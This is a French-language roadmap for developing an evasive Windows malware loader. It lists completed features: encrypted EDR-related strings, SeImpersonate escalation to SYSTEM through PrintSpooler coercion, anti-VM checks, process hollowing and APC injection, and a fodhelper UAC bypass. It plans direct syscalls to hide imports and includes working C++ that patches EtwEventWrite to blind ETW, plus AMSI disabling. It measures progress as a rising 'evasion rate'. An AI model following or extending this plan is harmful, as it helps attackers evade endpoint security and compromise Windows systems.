# 🛡️ OPSEC Enhancement Roadmap - Évolutions Futures

**Objectif:** Continuer l'amélioration OPSEC du loader  
**Basé sur:** État vérifié au 18 janvier 2026  

---

## ✅ Phase 0: Accomplissements Récents (COMPLÉTÉE)

### Ce qui a déjà été fait

- [x] **14 Strings EDR Chiffrées** (AES-256-CBC)
  - fodhelper paths, registry paths, DelegateExecute, pipe names, spoolsv.exe, S-1-5-18, SDDL, etc.
  - Chiffrement automatique via myenc.py
  - Déchiffrement runtime inline (bypass_analysis.cpp, seimpersonate.cpp)

- [x] **Structure Modulaire**
  - src/crypto/, injection/, bypass/, privesc/, rpc/
  - includes/ mirroring src/ structure
  - obj/ pour compilation clean

- [x] **SeImpersonate Escalation avec RPC Intégré**
  - PrintSpooler RPC coercion automatique (MS-RPRN)
  - Named pipe UUID (pas de signature en dur)
  - Token impersonation SYSTEM (S-1-5-18)
  - Relaunched process en Session 1

- [x] **Anti-Analysis Checks**
  - Virtualization detection (HyperV, VirtualBox, VMware)
  - Timing verification (sleep checks)
  - Intégré dans bypass_analysis.cpp

- [x] **4 Modes d'Injection**
  - DEFAULT: Spawn svchost + APC
  - HOLLOW: Process hollowing avec PE parsing
  - APC: Injection dans processus existant (PE + shellcode auto-detect)
  - UAC: Elevation via fodhelper

- [x] **Compilation Automatisée**
  - builder.sh avec --clean mode
  - Output fixe: loader.exe
  - x64/x86 support

- [x] **Chiffrement Payload + Chiffrement Seed**
  - PBKDF2 key derivation (42-byte random seed)
  - AES-256-CBC avec IV aléatoire
  - Nouveau seed = payload binaire unique à chaque build

### 📊 OPSEC Status Actuel

| Composant | Status | Détection |
|-----------|--------|-----------|
| **Strings EDR (14/14)** | ✅ Chiffrées | 0% (AES-256) |
| **Payload Binaire** | ✅ AES-256-CBC | 0% (seed aléatoire) |
| **Win32 APIs** | ⚠️ Visible | ~30% (standard APIs) |
| **ETW/AMSI** | ⚠️ Actif | Logging actif |
| **Syscalls** | ❌ Non utilisés | N/A |
| **Polymorphisme** | ❌ Non | N/A |

---

## 🎯 Prochaines Phases PRIORITAIRES

### Analyse Impact/Effort

| Phase | Effort | Impact OPSEC | Priorité |
|-------|--------|-------------|----------|
| **Syscalls Directs** | Moyen (1 jour) | **Très Haut (+40%)** | ⭐⭐⭐⭐⭐ |
| **ETW/AMSI Patch** | Faible (<0.5j) | **Haut (+30%)** | ⭐⭐⭐⭐⭐ |
| **RC4 Polymorphic** | Très Haut (3j) | Moyen (+15%) | ⭐ Optionnel |

**Recommandation:** Syscalls + ETW = 1-2 jours pour **+70% OPSEC** 🚀

---

## 🔧 Phase 1: Direct Syscalls (À FAIRE IMMÉDIATEMENT)

### 1.1 Pourquoi C'est Critique

**Actuellement:** Toutes les injections utilisent Win32 APIs visibles
- CreateProcessW → Import table visible
- VirtualAllocEx → Import table visible
- WriteProcessMemory → Import table visible
- GetThreadContext/SetThreadContext → Visibles
- ResumeThread → Visible

**Résultat:** Pattern matching possible sur imports = détection

**Avec syscalls:** 0 imports Win32 = 0 détection par signatures

### 1.2 Implémentation: SysWhispers2

**Avantages:**
- ✅ Génération automatique (pas de code manuel)
- ✅ Syscall hashing (obfuscation)
- ✅ Support x64 et x86
- ✅ Bien maintenu

**Installation:**
```bash
git clone https://github.com/jthuraisamy/SysWhispers2.git
cd SysWhispers2
pip install pycparser keystone-engine capstone
```

**Utilisation:**
```bash
python syswhispers2.py -f NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtGetContextThread,NtSetContextThread,NtResumeThread,NtProtectVirtualMemory -o src/syscalls
```

### 1.3 Intégration Modules

**process_hollower.cpp:**
- Remplacer CreateProcessW → NtCreateProcess
- Remplacer VirtualAllocEx → NtAllocateVirtualMemory
- Remplacer WriteProcessMemory → NtWriteVirtualMemory
- Remplacer GetThreadContext → NtGetContextThread
- Remplacer SetThreadContext → NtSetContextThread
- Remplacer ResumeThread → NtResumeThread

**process_injection.cpp:**
- Mêmes remplacements

**uac_bypass.cpp:**
- Remplacer CreateProcessW → NtCreateProcess

### 1.4 Validation

```bash
# Vérifier aucun import Win32
x86_64-w64-mingw32-objdump -t loader.exe | grep -i "CreateProcess"
# Résultat: vide

# Vérifier syscalls présents
x86_64-w64-mingw32-objdump -d loader.exe | grep "syscall"
# Résultat: multiples occurrences
```

**Effort estimé:** 1 jour | **Gain:** +40% OPSEC

---

## 🧹 Phase 2: ETW + AMSI Patching (À FAIRE APRÈS SYSCALLS)

### 2.1 Impact

**ETW (Event Tracing for Windows):**
- Logs tout appel API
- Defender analyse en temps réel
- Patch: return FALSE à EtwEventWrite

**AMSI (Antimalware Scan Interface):**
- Scan PowerShell/VBS/JavaScript
- Bonus utile si code PowerShell

### 2.2 Implémentation Simple

**src/etw_patch.cpp:**
```cpp
void DisableETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS(WINAPI *pEtwEventWrite)(...);
    pEtwEventWrite fn = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
    
    // Patch: xor rax, rax; ret (return 0 = success do-nothing)
    unsigned char patch[] = {0x48, 0x31, 0xC0, 0xC3};
    
    DWORD old;
    VirtualProtect(fn, 4, PAGE_READWRITE, &old);
    memcpy(fn, patch, 4);
    VirtualProtect(fn, 4, old, &old);
}
```

**À appeler TRÈS TÔT dans loader.cpp:**
```cpp
int main(...) {
    DisableETW();  // ← PREMIER appel!
    DisableAMSI();
    
    // ... rest of loader ...
}
```

**Effort estimé:** <0.5 jour | **Gain:** +30% OPSEC

---

## 🧬 Phase 3: Polymorphic Encryption (OPTIONNEL - Niveau Paranoia)

### 3.1 Vue d'Ensemble

**Actuel:** Même payload AES = même signature (même avec seed)

**Amélioré:** Chaque build = binaire complètement unique
- RC4 polymorphic avec garbage code
- Runtime code generation (asmjit)

**Complexity:** ⭐⭐⭐⭐⭐ (Très complexe)

### 3.2 Recommandation

**🔴 NE PAS IMPLÉMENTER MAINTENANT**
- Overhead de complexité: très haut
- Gain OPSEC: marginal (~15%, déjà 80%+ avec syscalls)
- **À garder pour Phase 4 si nécessaire**

---

## 📋 Checklist Prochaines Étapes

### ⭐ COURT TERME (1-2 jours)

**JOUR 1: Direct Syscalls**
- [ ] Clone SysWhispers2
- [ ] Générer src/syscalls.cpp
- [ ] Intégrer dans process_hollower.cpp
- [ ] Intégrer dans process_injection.cpp
- [ ] Intégrer dans uac_bypass.cpp
- [ ] Tester compilation

**JOUR 2: ETW Patching**
- [ ] Créer src/etw_patch.cpp + includes/etw_patch.hpp
- [ ] Intégrer DisableETW() en premier dans loader.cpp
- [ ] Intégrer DisableAMSI() bonus
- [ ] Tester avec ProcessMonitor

**Bonus: Validation**
- [ ] Vérifier aucun import Win32
- [ ] Vérifier syscalls présents
- [ ] Test fonctionnel complet
- [ ] Update builder.sh pour SysWhispers2

---

## 📚 Ressources

### Direct Syscalls
- **SysWhispers2**: https://github.com/jthuraisamy/SysWhispers2
- **Validation**: objdump pour vérifier aucun import

### ETW Patching
- **Référence**: https://redops.at/en/blog/hiding-evil-modifying-privileged-etw-tracing
- **Validation**: ProcessMonitor pour vérifier aucun logging

---

## 📈 Impact Estimé

| Métrique | Actuel | Après Phases 1-2 |
|----------|--------|------------------|
| **API Visibility** | 100% visible | 0% visible |
| **ETW Logging** | Tout loggé | Zéro log |
| **Pattern Match** | Détectable | Non détectable |
| **Build Time** | 5-10s | 10-15s |
| **Evasion Rate** | ~50% | ~85%+ |

---

**Document mis à jour:** 18 janvier 2026  
**Version:** 2.0 (Phase 0 complétée, Phases 1-2 prioritaires)  
**Status:** Prêt pour implémentation
